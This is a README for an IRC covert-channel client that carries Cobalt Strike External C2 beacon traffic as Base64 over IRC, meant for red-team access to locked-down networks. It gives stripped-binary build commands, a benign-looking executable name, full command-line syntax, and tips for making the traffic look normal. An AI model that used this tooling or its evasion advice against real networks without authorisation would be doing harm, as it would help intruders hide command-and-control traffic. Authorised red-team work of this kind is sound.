IRC Covert Channel Client Readme

NOTE: This project is a work in progress. When building using VisualStudio turn Project Properties-C/C++-Code Generation- Runtime Library to Multi-threaded(/MT)
	instead of Multi-threaded DLL (/MD) to remove dependency on DLLs. Also change General-Platform Toolset to Visual Studio 2015 - Windows XP if your 
	target is older. 
	When using MinGW use the following command: i686-w64-mingw32-gcc -s -O3 -fvisibility=hidden -o mIRCHelper.exe Client/B64Mode/ClientRelease.c -lws2_32

	If using the hardcoded program, make sure to edit the hardcoded values before compiling!

Status: 
	B64Mode - Client sends B64 encoded messages over IRC to Server.
		ClientDebug.c - DEBUG
		ClientRelease.c - Release (No print/output)
		ClientDebugHardcode.c - DEBUG with hardcoded input
		ClientReleaseHardcode.c - Release with hardcoded input
	CloakifyMode - CloakifyMode is still broken. When fixed keep in mind it will take much longer and create more traffic.

Intent: Develop a covert channel that uses IRC to communicate and integrate it into Cobalt Strike to allow the red team to 
	interact with a locked down network.

Future work:
	Fix cloakify mode.

IRCExternalC2:
	Run with the following command (Replace mIRCHelper with what you named it when compiling):
		 mIRCHelper.exe [IP] [PORT] [NICK] [OP_NICK] [OP_PASS] [USER] [REALNAME] [CHANNEL] [TGTNICK] [SLEEP(ms)] [TRAFFIC_STR] [LEN_STR] [START_STR] [PIPE_STR]
	Ex: IRCExternalC2.exe 10.10.10.128 6667 bob bot bot bob bob bot alice 2000 TrafficGen Len cloak mIRC
	[IP] - IP of IRC server, not teamserver. (i.e. UnrealIRCd server)
	[PORT] - Port number of IRC server. Typically 6667
	[NICK] - Name your client will use in IRC
	[OP_NICK] - Nick of operator you will authenticate as
	[OP_PASS] - Password used for authenticating as operator
	[USER] - User your server will use. Only passed to look more normal, choose any normal/expected username.
	[REALNAME] - Realname your server will use. Only passed to look more normal, choose any normal/expected realname.
	[CHANNEL] - Channel your server will connect to. Enter without #, we do that for you.
	[TGTNICK] - Nick of client you will talk to. You need to set this to the NICK you pass to your server program on the teamserver
	[SLEEP(ms)] - Time client will sleep if the beacon has nothing to send back. In milliseconds
	[TRAFFIC_STR] - String that will prefix the B64 encoded message. (i.e. TrafficGen) This will be used to find the data in the string. It must be the same as the server.
	[LEN_STR] - String that will prefix the int representing the length of the incomming B64 encoded data. (i.e. Len) This will be used to find the lenth. It must be the same as the server.
	[START_STR] - String that will tell the server to start transmitting data. It must be the same as the server.
	[PIPE_STR] - String to name the pipe to the beacon. (i.e. mIRC)

	The program will connect to the IRC server using the information passed to it. It will then send a message telling the covert server 
	to start sending traffic. Messages will be in the form of Cobalt Strike External C2 frames encoded into Base64.  
	

	NOTE on IRC: IRC will introduce an artificial lag of 1 second between messages for non operators if sending messages too fast.
		This will drastically slow down the channel. Operators in an operator class with the attribute of immune { lag; }; are immune to this lag.
		Highly recommend modifying the IRC server config to include this.

